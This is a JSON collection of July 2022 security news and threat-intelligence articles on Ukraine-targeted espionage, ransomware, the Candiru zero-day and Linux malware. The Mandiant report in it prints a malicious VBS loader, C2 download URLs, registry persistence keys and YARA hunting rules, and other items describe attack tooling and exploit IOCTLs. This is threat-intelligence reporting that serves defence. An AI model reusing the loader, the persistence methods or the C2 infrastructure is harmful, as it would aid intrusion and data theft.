[
   {
      "time": "2022-07-22",
      "title": "Evacuation and Humanitarian Documents used to Spear Phish Ukrainian Entities | Mandiant",
      "text": " Explore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology.Solve your toughest cyber security challenges with combinations of products and services.Mitigate threats, reduce risk, and get back to business with the help of leading experts.Mandiant specializes in cyber threat intelligence, offering products, services, and more to support our mission to defend against cyber crime.Get the latest insights from cyber security experts at the frontlines of threat intelligence and incident responseLearn more about us and our mission to help organizations defend against cyber crime. UA CERT has also published on several of these operations. Links to UA CERT reports can be found throughout this blog.Since the start of the Russian invasion, public and private Ukrainian entities have been targeted by multiple cyber espionage groups. This blog goes into detail regarding two operations from UNC2589 and an operation from clusters likely related to UNC1151. While these groups have distinct sponsors and goals, the operations detailed here are united by their use of lure documents about public safety to entice victims to open the spear phishing attachment. Spear phishes with themes that are urgent or timely can make a recipient more likely to open them and documents related to public safety and humanitarian emergencies are of particularly high interest to the residents of Ukraine following the Russian invasion. These operations were designed to gain access to networks of interest, but we do not have insight into the planned follow-on activities. The malware used in these intrusion attempts would enable a wide variety of operations and these groups have previously conducted espionage, information operations and disruptive attacks. The intrusion attempts detailed below share a tactic, however they are the work of two separate cyber espionage groups. The activity discussed below is only a small subset of the extensive cyber operations that have targeted Ukraine with disruptive and espionage motivated operations. UNC2589 is a cluster of cyber espionage activity Mandiant has tracked since early 2021 and may have been active as early as late 2020. Though UNC2589 has primarily targeted entities in Ukraine and Eastern Europe, it has also actively targeted government and defense entities throughout Europe and North America. We believe UNC2589 acts in support of Russian government goals, but have not uncovered evidence to link it conclusively.UNC2589 uses spear phishing campaigns, which may be disguised as forwarded emails from both actor-controlled and compromised legitimate accounts. Lure themes leveraged by UNC2589 include COVID-19, the war in Ukraine, government related themes, regional themes, or even generic themes such as Bitcoin. Payloads for the phishing operations include malicious macro documents, CPL downloaders, ZIP files, or other archives. UNC2589 has also used a variety of different infrastructure, including actor-controlled domains, IP addresses located mostly in Russia, and Discord channels.Though we track UNC2589 as a cluster of cyber espionage activity, we have attributed the January 14 destructive attack on Ukraine using PAYWIPE (WHISPERGATE) to UNC2589. We believe UNC2589 may be capable of engaging in disruptive or destructive cyber operations in the future.GRIMPLANT is a backdoor written in GO which reaches out using Google RPC to a Base64-encoded and AESCTS-encrypted C&C read from a command-line argument. GRIMPLANT conducts a system survey which it uploads to the C&C and can execute commands provided by the C&C on the victim’s device.Mandiant analyzed a malicious document with an evacuation plan-themed lure, likely used by UNC2589 to target Ukrainian entities in a phishing campaign in late February 2022. This sample is a packed SFX RAR that runs and installs an Arabic version of the RemoteUtils utility. Upon execution, the Remote Utilities utility reaches out to a C&C used in an earlier UNC2589 operation also targeting UkraineThe infection vector is currently uncertain, but we suspect the malicious files may have been delivered via phishing email. It is important to note that Remote Utilities comes in a UPX-packed SFX RAR from the vendor, and it does not appear the attackers changed the default. However, the attackers appear to have used several layers of password-protected archives before dropping and executing the default UPX-packed SFX extractor with a SFX RAR. The lure documents all reference an “evacuation plan” allegedly originating from the Ukrainian SBU.Upon execution of the packed SFX RAR, it installs the Remote Utilities executable. The Remote Utilities executable reaches out to preconfigured C&Cs iteratively over TCP:Remote Utilities is not malicious by itself but can be used maliciously by threat actors. The utility can enable a threat actor to:Remote Utilities allows attackers to set persistence through creating a startup service.The malware was delivered via phishing email. The attacker used a compromised legitimate account from a related organization to send the phishing emails on March 27. The phishing email contained an attached XLS document with macros.The macros in the document were designed by ExcelVBA.ru, a company that designs macros for business use. However, in this case the macro was used to drop a malicious payload onto the victim machine. The company’s website makes the macros freely available, so we have no indication that they are tied to this activity or even aware of it. Upon execution of Base-Update.exe, it proceeds to download, Base64-decode, and execute another time stomped downloader written in Go from http://194.31.98.124:443/i with the arguments –a 0CyCcrhI/6B5wKE8XLOd+w==:Java-sdk.exe sets persistence for itself via setting a Run registry key. It then proceeds to download, decode, and execute two additional Base64-encoded files, GRIMPLANT and GRAPHSTEEL.Upon execution of GRIMPLANT, it reads its configured C&C from the command line. The configured C&C is Base64-encoded and AESCTS-encrypted and results in GRIMPLANT communicating to 194.31.98.124. GRIMPLANT conducts a basic system survey, querying the following:GRIMPLANT then uploads the system survey to the C&C. Note that GRIMPLANT communicates with the C&C over Google RPC using TLS. GRIMPLANT handles PowerShell commands it receives from the C&C, sending the result of the command back to the C&C. Unlike GRAPHSTEEL, GRIMPLANT does not use an added layer of encryption to its C&C communications.Upon execution of GRAPHSTEEL, it conducts a system survey of the host and user information and reaches out to the ipify API to determine the IP address. It then AESCTS encrypts and uploads the surveyed victim information to the C&C. When it gets a response from the C&C, GRAPHSTEEL proceeds to harvest browser credentials, including:GRAPHSTEEL also attempts to collect mail data from Mozilla Thunderbird, extract data from Filezilla, find unprotected SSH keys on the target machine, query Putty to access the public key, and read any MobaXterm config. After collecting this information, it encrypts and uploads the information to the C&C. GRAPHSTEEL then enumerates drives D-Z and the files within each drive. GRAPHSTEEL reads the content of each unique file and uploads those to the C&C.Note: the GRAPHSTEEL project also does not have symbols stripped and the main Go package is called “elephant.”The malware maintains its persistence on the victim’s system by setting the following Run registry key:Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\java-sdkValue: %TEMP%\\java-sdk.exe -a               Downloaded as Base64 encoded text from http://45.84.0.116:443/pUNC1151 primarily targets government and media entities focusing on Ukraine, Lithuania, Latvia, Poland, and Germany. UNC1151 has been active in targeting primarily Ukraine and Poland since the Russian invasion of Ukraine in February. BEACON is a backdoor written in C/C++ that is part of the Cobalt Strike framework. Supported backdoor commands include shell command execution, file transfer, file execution, and file management. BEACON can also capture keystrokes and screenshots as well as act as a proxy server. BEACON may also be tasked with harvesting system credentials, port scanning, and enumerating systems on a network. BEACON communicates with a C&C server via HTTP or DNS.Note: the version of MICROBACKDOOR used by UNC1151 in this report has been modified by the actor to include a screenshot functionality. Screenshot functionality is not present in the version of MICROBACKDOOR available on Github.To deliver the payload, the actor used a ZIP containing a CHM-file.If the desktop.ini does not exist in the path C:\\Users\\Public\\Favorites\\desktop.ini (indicating that the backdoor is not yet installed), the VBS code within dovidka.chm drops the decoded next payload to C:\\Users\\Public\\ignit.vbs. The code then creates the folder C:\\Users\\Public\\Favorites and executes C:\\Users\\Public\\ignit.vbs. The VBS file ignit.vbs mentioned in figure 4, drops three files: Either via the LNK after startup, or directly via the VBS, the command line “wscript.exe //B //E:vbs C:\\Users\\Public\\Favorites\\desktop.ini” is executed, referencing the helper file dropped by the sample mentioned above. Finally, the file C:\\Users\\Public\\ignit.vbs is deleted after execution. “desktop.ini” is used to invoke regasm.exe to launch the payload found in C:\\Users\\Public\\Libraries\\core.dll as a hidden window without returning any error codes.The entire contents of this file are:Set fso = CreateObject(\"Scripting.FileSystemObject\")execPath = \"C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe  /U \" & \"C:\\Users\\Public\\Libraries\\core.dll\"Set shell = CreateObject(\"Wscript.Shell\")shell.run(execPath), 0, falseThe file C:\\Users\\Public\\Libraries\\core.dll is a malicious .NET file packed with an unknown obfuscator which may be related to Confuser. This samples drops an additional malicious payload into memory and executes it.The payload (MD5: 047fbbb380cbf9cd263c482b70ddb26f) is a sample of MICROBACKDOOR. This backdoor malware has capabilities such as manipulating files (list/get/put), execute commands, can automatically update itself, and take screenshots. This family also supports HTTP, Socks4 and Socks5 proxies to route traffic. Once run, the MICROBACKDOOR payload would reach out to ‘xbeta.online:8443’. It would transmit a packet of data every 10 seconds. T1003: OS Credential DumpingT1027: Obfuscated Files or InformationT1027.002: Software PackingT1055: Process InjectionT1059: Command and Scripting InterpreterT1059.005: Visual BasicT1070.006: TimestompT1071.001: Web ProtocolsT1082: System Information DiscoveryT1083: File and Directory DiscoveryT1114.001: Local Email CollectionT1140: Deobfuscate/Decode Files or InformationT1497.001: System ChecksT1547.001: Registry Run Keys / Startup FolderT1552.001: Credentials In FilesT1555.003: Credentials from Web BrowsersT1560: Archive Collected DataT1560.001: Archive via UtilityT1566.001: Spearphishing AttachmentT1573.001: Symmetric CryptographyT1573.002: Asymmetric CryptographyT1622: Debugger EvasionT1012: Query RegistryT1016: System Network Configuration DiscoveryT1027: Obfuscated Files or InformationT1033: System Owner/User DiscoveryT1055: Process InjectionT1059: Command and Scripting InterpreterT1070.006: TimestompT1071.001: Web ProtocolsT1082: System Information DiscoveryT1083: File and Directory DiscoveryT1087: Account DiscoveryT1095: Non-Application Layer ProtocolT1140: Deobfuscate/Decode Files or InformationT1547.009: Shortcut ModificationT1573.002: Asymmetric CryptographyT1620: Reflective Code LoadingT1622: Debugger Evasionrule MTI_HUNTING_Crypto_GRIMPLANT_GRAPHSTEEL{    meta:        author = \"Mandiant Threat Intelligence\"        descr = \"Find the crypto key for GRIMPLANT/GRAPHSTEEL C2 decryption\"    disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment.\"    strings:            $ = {f1 d2 19 60 d8 eb 2f dd f2 53 8d 29 a5 fd 50 b5}        $ = {f6 4a 3f 9b f0 6f 2a 3c 4c 95 04 38 c9 a7 f7 8e}        $ = \" ciphertext is not large enough. It is less that one block size. Blocksize:%v; Ciphertext:%v\"            condition:        all of them}rule MTI_Hunt_APT_Modified_MICROBACKDOOR_Strings{  meta:     description = \"Detects strings found in modified MICROBACKDOOR samples with screenshot capability\"      disclaimer = \"This rule is meant for hunting and is not tested to run in a production environment\"  strings:      $a = \"ERROR: Unknown command\"      $b = \"ProxyServer\"      $c = \"screenshot\"      $d = \"uninst\"      $e = \"shell\"      $f = \"client.dll\"      $g = \"Timeout occured\"  condition:      all of them} Get the Google Cloud Cyberseurity Forecast 2024 report to explore the latest trends on the horizon.Mandiant experts are ready to answer your questions.REPORTare managing the evolving threat landscape© Copyright 2023 Mandiant. All rights reserved."
   },
   {
      "time": "2022-07-22",
      "title": "Hacked Ukrainian radio stations broadcast fakes about Zelensky’s health",
      "text": " Unidentified hackers broadcasted reports that Zelensky was in an intensive care ward and that his duties were being temporarily performed by Chairman of the Ukrainian parliament Ruslan Stefanchuk, according to Ukraine’s State Special Communications Service.“I am in the office and I have never felt as healthy as I do now,” Zelensky said.A music program on at least one out of TavrMedia’s nine radio stations was interrupted by the false reports about Zelensky’s health at around 1 p.m. The company didn’t mention which station the message was broadcast on.The Kyiv Independent reached out to TavrMedia but didn’t receive a response before the time of publication.It is still unclear how many people heard the fake news about Zelensky on the radio. The hackers broadcasted it during prime time, between 12 and 2 p.m.In Ukraine, TavrMedia controls the country’s most popular radio stations: Hit FM, Radio Roks, Kiss FM, Radio Relax, Melodiya FM, Nashe Radio, Radio Jazz, Classic Radio and Radio Bayraktar, a radio station broadcasting Ukrainian music that was launched after Russia’s full-scale invasion of Ukraine.It is too early to say which hacker group is behind the attack – the incident will have to first be investigated by the Ukrainian state cyberattacks response unit CERT-UA, said Volodymyr Styran, Ukrainian cybersecurity expert and co-founder of cybersecurity firm Berezha Security Group.According to Styran, there are five main elements by which researchers can classify an incident: goal, effect, attacker, target, and relationship between the target and the attacker.“In this case, the goal of the hackers was Ukrainian radio, the effect was disinformation, the goal was political and military destabilization, the relationship was a war between Russia and Ukraine,” he told the Kyiv Independent.This attack is not surprising considering the ongoing cyberwar between Russia and Ukraine.Hacker groups around the world have also joined the fight and taken either Russian or Ukrainian sides. Among hacker gangs siding with Ukraine are Anonymous, Ghostsec, AgainstTheWest, Belarusian Cyber Partisans, ContiLeaks.Hacker groups working for Russia include Conti, Killnet, SandWorm, UNC1151.There have been on-air incidents in Russia as well. In June, for example, one group hacked the Russian radio station Kommersant FM to broadcast the Ukrainian anthem and anti-war songs.And on May 9, when Russians celebrate Victory Day, a commemoration of the Soviet Union’s role in defeating Nazi Germany in World War II, Russian smart TVs were hacked to display a message saying “the blood of thousands of Ukrainian children is on your hands.”\n          Copyright © 2023 The Kyiv Independent\n        "
   },
   {
      "time": "2022-07-22",
      "title": "Researchers uncover potential ransomware network with U.S. connections | CyberScoop",
      "text": " \n\nJuly 21, 2022\n\nTypically, when it comes to ransomware, researcher and cybersecurity companies scramble after attacks to understand the origin of the malware that infected systems and locked crucial data. The company shared the findings in hopes that the wider research and security community would research this network further, said Matt Lembright, Censys’ director of federal applications.“For folks that live and breathe this every single day, there might be something for them to latch on to here,” Lembright said.The information has been shared with the FBI, he added, to determine whether it’s connected to any known attacks.Allan Liska, a threat intelligence analyst with Recorded Future, said Thursday that the data “Censys uncovered appears to indicate an ongoing ransomware campaign, likely tied to MedusaLocker or one of its derivatives.” MedusaLocker “has been an active, but smaller, ransomware group over the last few years,” he added. “They do not operate an extortion site so it is difficult to pinpoint the true number of victims they have hit.”Lembright told CyberScoop that the findings don’t definitively spell out exactly what this network is, or what it’s done, but hopefully it can help.“I can’t say definitively that these hosts haven’t attacked anyone yet, but they’re definitely capable of it,” he said. The idea is to share both the historical and current data associated with the hosts to unpack a potential network and prevent future damage. “This is kind of a chance to go out into the world and do some active hunting.”"
   },
   {
      "time": "2022-07-22",
      "title": "Windows 11 KB5015882 update fixes bugs causing File Explorer to freeze",
      "text": " Microsoft has released the optional KB5015882 Preview cumulative update for Windows 11 with 20 fixes or improvements, including new Focus Assist and OS upgrade features.This Windows 11 cumulative update is part of Microsoft's July 2022 monthly \"C\" update, allowing users to test the upcoming updates and fixes in the August 2022 Patch Tuesday.Unlike cumulative updates released on Patch Tuesday, preview updates do not contain security updates and only include bug fixes and performance improvements.Windows users can install this update by going into Settings, clicking on Windows Update, and selecting 'Check for Updates.' As this is an optional update, you will be prompted to click on the download and install button before Windows 11 will install the update.After installing the KB5015882 update, Windows 11's version number will change to build 22000.832.The Windows 11 KB5015882 cumulative update preview includes 20 improvements or fixes, with the highlighted ones listed below:New!  Gives you the option to receive urgent notifications when focus assist is on. Focus assist is like a do not disturb mode that hides notifications. New! Gives you the option to update to a newer Windows 11 version at the very first startup of Windows if your device is eligible.Addresses an issue that causes File Explorer to stop working when you use the play and pause keyboard buttons on certain devices.Addresses an issue that causes File Explorer to stop working when you use the Start menu’s context menu (Win+X) and an external monitor is connected to your device.Addresses an issue that displays a blank window that you cannot close when you hover over the search icon on the taskbar.Addresses an issue that prevents certain troubleshooting tools from opening.The new feature to update to the latest version of Windows 11 on the first run of the operating system is helpful, as it will allow users to automatically install the latest security updates before they gain access to the OS. This will add additional security protection when setting up a new device.Microsoft notes that only sites using the 'windows.focus()' method are affected by this bug.\"After installing this update, IE mode tabs in Microsoft Edge might stop responding when a site displays a modal dialog box,\" explains the KB5015882 release notes.\"A modal dialog box is a form or dialog box that requires the user to respond before continuing or interacting with other portions of the webpage or app.\"Microsoft notes that only sites using the windows.focus() method are affected by this bug."
   },
   {
      "time": "2022-07-22",
      "title": "China cybersecurity agency fines ride-hailing giant Didi $1.2 billion for data issues",
      "text": " China's internet regulator on Thursday fined ride-hailing giant Didi $1.2 billion for the company’s voracious data collection policies and lackluster security protections around sensitive user information. The investigation of Didi began last year and the agency said it found 16 violations that included the illegal collection of nearly 12 million users’ photo albums, 107 million facial recognition profiles of passengers and significant amounts of data on user’s personal information. Didi kept millions of sensitive user records unencrypted, causing “national security risks,” according to Chinese regulators. “Previously, the network security review also found that Didi has data processing activities that seriously affect national security, as well as other violations of laws and regulations such as refusal to fulfill the clear requirements of the regulatory authorities, violation of the law, malicious evasion of supervision, etc,” the spokesperson said. “Didi's illegal operations have brought serious security risks to the security of the country's key information infrastructure and data security. Didi's violations of laws and regulations are serious, and should be severely punished in light of the network security review.”Founded in 2013, Didi quickly became one of the most popular rideshare apps in China, offering a variety of vehicle-related services. Cheng Wei, Didi’s CEO and chairman, and the company’s president, Liu Qing, were each fined about $150,000. The Chinese government added that when Didi was asked to make changes to its data collection policies, it was ignored. The problems began in 2015 and continued even after China passed its Cybersecurity Law in 2017. “Didi Company illegally processed 64.709 billion pieces of personal information, a huge number, including facial recognition information, precise location information, ID numbers and other sensitive personal information,” the government spokesperson said. “Didi's illegal activities involve multiple apps, including excessive collection of personal information, compulsory collection of sensitive personal information, frequent claims of rights by the app, failure to fulfill the obligation to notify the handling of personal information, and failure to fulfill network security.” The Cyberspace Administration of China said it plans to “intensify” its enforcement of cybersecurity and data protection laws in the coming years. “We will take a warning from this, and stick to placing equal emphasis on safety and development. We will further strengthen the construction of network security and data security, strengthen the protection of personal information, earnestly fulfill our social responsibility, serve every passenger, driver and partner well, and realize the safe, health and sustainable development of the enterprise,” the company said. Didi was barred from adding any new users and was required to shutter 25 of its apps during the investigation by Chinese regulators. The company did not respond to requests for comment about whether it will now be allowed to add new users. The financial penalty aligns with Chinese rules explaining that companies can be fined up to 5% of their annual revenue for violations of the China's Personal Information Protection Law. The $1.2 billion represents about 4.6% of Didi’s $25.7 billion revenue from 2021. Jonathan Greig is a Breaking News Reporter at Recorded Future News. Jonathan has worked across the globe as a journalist since 2014. Before moving back to New York City, he worked for news outlets in South Africa, Jordan and Cambodia. He previously covered cybersecurity at ZDNet and TechRepublic.© Copyright 2023 | The Record from Recorded Future News"
   },
   {
      "time": "2022-07-22",
      "title": "MI6 chief: Russia’s spies ‘not having a great war’ in Ukraine",
      "text": " Hundreds of Russian spies have been expelled from Europe in recent months, dealing a major blow to Moscow’s intelligence efforts during its war with Ukraine, said the head of Britain’s Secret Intelligence Service, or MI6, on Thursday.“Across Europe, roughly half — at last count, north of 400 Russian intelligence officers operating under diplomatic cover — have been expelled,” said the U.K.’s spy chief Richard Moore in a rare appearance at the Aspen Security Forum in Colorado.” We reckon in the U.K. that’s probably reduced their ability to do their business, to spy for Russia, in half.”Moore, speaking to CNN’s Jim Sciutto in his first public interview outside the U.K., said Russia’s intelligence agencies have spent years developing these so-called “sleeper agents” with little to show for it.“If I reflect on our Russian counterparts… I don’t think they’re having a great war. They clearly completely misunderstood Ukrainian nationalism, they underestimated the degree of resistance the Russian military would face, and it was a toxic combination of them not getting their intelligence right [and not being able to communicate it with President Vladimir Putin],” Moore said.Although Moore ridiculed Russia’s intelligence operations, he said their partners in Beijing should not be overlooked.China’s intelligence agencies are “extraordinarily well resourced – I mean there are hundreds of thousands of civilian intelligence officers, let alone their military capability,” Moore said. “They are ferociously active right across the cyber domain.”However, Moore stressed that the friendship is lopsided.“It’s not an equal partnership, and Ukraine has made it less equal. Moscow is the junior partner and Beijing is in the driver’s seat,” he said.Adam Janofsky is the founding editor-in-chief of The Record by Recorded Future. He previously was the cybersecurity and privacy reporter for Protocol, and prior to that covered cybersecurity, AI, and other emerging technology for The Wall Street Journal.© Copyright 2023 | The Record from Recorded Future News"
   },
   {
      "time": "2022-07-22",
      "title": "Senators intro bill to foster federal move to quantum-resistant technology",
      "text": " A bipartisan pair of senators on Thursday introduced legislation to motivate federal agencies to shift their information systems to quantum-resistant cryptography.“The development of quantum computers is one of the next frontiers in technology, and with this emerging technology comes new risks as well,” Hassan, who chairs the Senate Homeland Security Committee’s emerging threats subpanel, said in a statement. “Our national security information must remain secure as this technology quickly develops, and it is essential that the federal government is prepared to address cybersecurity concerns.”Portman, the committee’s top Republican who is retiring at the end of the year, said the legislation would help tackle digital challenges by requiring the government to “inventory its cryptographic systems, determine which are most at risk from quantum computing, and upgrade those systems accordingly.”Earlier this year, President Joe Biden issued two directives to foster better quantum technology research within the government and help guide agencies to a post-quantum cryptography standard.Speaking at the Aspen Security Forum on Wednesday, Anne Neuberger, the deputy national security advisor for cyber and emergency technology, called the potential for quantum computers to be used by an adversary country \"a nuclear threat to cybersecurity.\"\"We're on a rapid transition in government but, frankly, private sector, e-commerce is vulnerable as well, and the nation's economy is as much a priority of course is our national security,\" she added.Martin Matishak is a senior cybersecurity reporter for The Record. He spent the last five years at Politico, where he covered Congress, the Pentagon and the U.S. intelligence community and was a driving force behind the publication's cybersecurity newsletter.© Copyright 2023 | The Record from Recorded Future News"
   },
   {
      "time": "2022-07-22",
      "title": "The Return of Candiru: Zero-days in the Middle East - Avast Threat Labs",
      "text": " We recently discovered a zero-day vulnerability in Google Chrome (CVE-2022-2294) when it was exploited in the wild in an attempt to attack Avast users in the Middle East. Specifically, a large portion of the attacks took place in Lebanon, where journalists were among the targeted parties.There were multiple attack campaigns, each delivering the exploit to the victims in its own way. In Lebanon, the attackers seem to have compromised a website used by employees of a news agency. We can’t say for sure what the attackers might have been after, however often the reason why attackers go after journalists is to spy on them and the stories they’re working on directly, or to get to their sources and gather compromising information and sensitive data they shared with the press.Interestingly, the compromised website contained artifacts of persistent XSS attacks, with there being pages that contained calls to the Javascript function alert along with keywords like test. We suppose that this is how the attackers tested the XSS vulnerability, before ultimately exploiting it for real by injecting a piece of code that loads malicious Javascript from an attacker-controlled domain. This injected code was then responsible for routing the intended victims (and only the intended victims) to the exploit server, through several other attacker-controlled domains.Once the victim gets to the exploit server, Candiru gathers more information. A profile of the victim’s browser, consisting of about 50 data points, is collected and sent to the attackers. The collected information includes the victim’s language, timezone, screen information, device type, browser plugins, referrer, device memory, cookie functionality, and more. We suppose this was done to further protect the exploit and make sure that it only gets delivered to the targeted victims. If the collected data satisfies the exploit server, it uses RSA-2048 to exchange an encryption key with the victim. This encryption key is used with AES-256-CBC to establish an encrypted channel through which the zero-day exploits get delivered to the victim. This encrypted channel is set up on top of TLS, effectively hiding the exploits even from those who would be decrypting the TLS session in order to capture plaintext HTTP traffic.The driver is exploited through IOCTL requests. In particular, there are two vulnerable IOCTLs: 0x9C40648C can be abused for reading physical memory and 0x9C40A4CC for writing physical memory. We reported this to the driver’s developer, who acknowledged the vulnerability and claimed to be working on a patch. Unfortunately, the patch will not stop the attackers, since they can just continue to exploit the older, unpatched driver. We are also discussing a possible revocation, but that would not be a silver bullet either, because Windows doesn’t always check the driver’s revocation status. Driver blocklisting seems to be the best solution for now.While there is no way for us to know for certain whether or not the WebRTC vulnerability was exploited by other groups as well, it is a possibility. Sometimes zero-days get independently discovered by multiple groups, sometimes someone sells the same vulnerability/exploit to multiple groups, etc. But we have no indication that there is another group exploiting this same zero-day.Because Google was fast to patch the vulnerability on July 4, Chrome users simply need to click the button when the browser prompts them to “restart to finish applying the update.” The same procedure should be followed by users of most other Chromium-based browsers, including Avast Secure Browser. Safari users should update to version 15.6. Stunning 50% Surge in Blocked Attacks, Resulting in 1 Billion Monthly BlocksTechnical analysis of Rhysida Ransomware family that emerged in the Q2 of 20232023 Copyright © Avast Software s.r.o."
   },
   {
      "time": "2022-07-22",
      "title": "How Conti ransomware hacked and encrypted the Costa Rican government",
      "text": " Details have emerged on how the Conti ransomware gang breached the Costa Rican government, showing the attack's precision and the speed of moving from initial access to the final stage of encrypting devices.This is the last attack from the Conti ransomware operation before the group transitioned to a different form of organization that relies on multiple cells working with other gangs.On April 11, 2022, Conti began their last incursion under this brand after gaining initial access to the Costa Rica government’s network and engaging in reconnaissance activity.The threat actor entry point was a system belonging to Costa Rica’s Ministry of Finance, to which a member of the group referred to as ‘MemberX’ gained access over a VPN connection using compromised credentials.Advanced Intelligence CEO Vitali Kremez told BleepingComputer that the compromised credentials were obtained from malware installed on the initial device compromised on the victim network. More than 10 Cobalt Strike beacon sessions were set up in the early stages of the attack, AdvIntel researchers say in the report.After gaining local network domain administrator access, the intruder used the Nltest command-line tool to enumerate domain trust relationships. Next, they scanned the network for file shares using ShareFinder and AdFind utilities.AdvIntel’s details on the threat actor’s activity on the Costa Rica government’s network include the specific commands used at each step.According to the researchers, MemberX then used the Cobalt Strike backdoor channel to download the fileshare output to a local machine.The attacker was able to access administrative shares where they uploaded a Cobalt Strike DLL beacon and then ran it using the PsExec tool for remote file execution.Using the Mimikatz post-exploitation tool for exfiltrating credentials, the adversary collected the logon passwords and NTDS hashes for the local users, thus getting “plaintext and bruteable local admin, domain and enterprise administrator hashes.”To make sure that they don’t lose access in case defenders detect the Cobalt Strike beacons, Conti planted the Atera remote access tool on hosts with less user activity where they had administrative privileges.Stealing the data was possible using the Rclone command-line program that can manage files on multiple cloud storage services. Conti used this to upload data to the MEGA file hosting service.A diagram of the attack flow:According to a note on the Conti leak site, the ransom demand was initially $10 million and then increased to $20 million when Costa Rica refused to pay.AdvIntel notes that Conti’s attack on the Costa Rican government “was relatively unsophisticated” and that a ‘flat’ network designed combined with misconfigured administrative shares helped the attacker move to domain trusts."
   },
   {
      "time": "2022-07-22",
      "title": "Hackers Target Ukrainian Software Company Using GoMet Backdoor",
      "text": " A large software development company whose software is used by different state entities in Ukraine was at the receiving end of an \"uncommon\" piece of malware, new research has found.Although there are no concrete indicators linking the attack to a single actor or group, the cybersecurity firm's assessment points to Russian nation-state activity.\"We haven't seen GoMet deployed across the other organizations we've been working closely with and monitoring so that implies it is targeted in some manner but could be in use against additional targets we don't have visibility into,\" Nick Biasini, head of outreach for Cisco Talos, told The Hacker News.\"We have also conducted relatively rigorous historic analysis and see very little use of GoMet historically which further indicates that it is being used in very targeted ways.\"\"The majority of the attacks we've been seeing lately are related to access, either directly or through credential acquisition,\" Biasini said. \"This is another example of that with GoMet being deployed as a backdoor.\"\"Once the access has been established, additional reconnaissance and more thorough operations can follow. We're working to kill the attacks before they get to this stage so it's difficult to predict the types of follow-on attacks.\"Discover how application detection, response, and automated behavior modeling can revolutionize your defense against insider threats.Join the conversation to learn how to combat Zenbleed and Kubernetes attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
   },
   {
      "time": "2022-07-22",
      "title": "New ‘Lightning Framework’ Linux malware installs rootkits, backdoors",
      "text": " A previously undetected malware dubbed 'Lightning Framework' that targets Linux systems can be used to backdoor infected devices using SSH and deploy rootkits to cover the attackers' tracks.Described as a \"Swiss Army Knife\" in a report published today by Intezer, Lightning Framework is a modular malware that also comes with support for plugins.This malware is yet to be spotted in the wild, and some of its components (referenced in the source code) are yet to be found and analyzed.Lightning Framework is built using a simple structure: a downloader component that will download and install the malware's other modules and plugins, including its core module, on compromised Linux devices.After reaching out to its command-and-control (C2) server over TCP sockets using C2 info stored in undetectable polymorphic encoded configuration files, Lightning Framework fetches its plugins and the core module.This core module (kkdmflush) is the framework's main module and is the one the malware uses to receive commands from its C2 server and to execute its plugins.It can also achieve persistence by creating a script named elastisearch under at /etc/rc.d/init.d/ that gets executed on each system boot to launch the downloader module and reinfect the device.Last but not least, this malware will also add its own SSH-based backdoor by starting an SSH server using one of the downloaded plugins (Linux.Plugin.Lightning.Sshd).The newly launched OpenSSH daemon has hardcoded private and host keys, enabling attackers to SSH into the infected machines using their own SSH keys.\"The Lightning Framework is an interesting malware as it is not common to see such a large framework developed for targeting Linux,\" Robinson concluded.\"Although we do not have all the files, we can infer some of the missing functionality based on strings and code of the modules that we do possess.\"Lightning Framework is just the latest Linux malware strain capable of fully compromising and backdooring devices that surfaced recently.Intezer security researchers have also spotted OrBit, a stealthy malware that hijacks shared libraries to intercept function calls to steal information from backdoored Linux systems and infect all running processes.\"With the rise in use of the cloud, it is no wonder that malware innovation is still accelerating at breakneck speed in this realm.\""
   }
]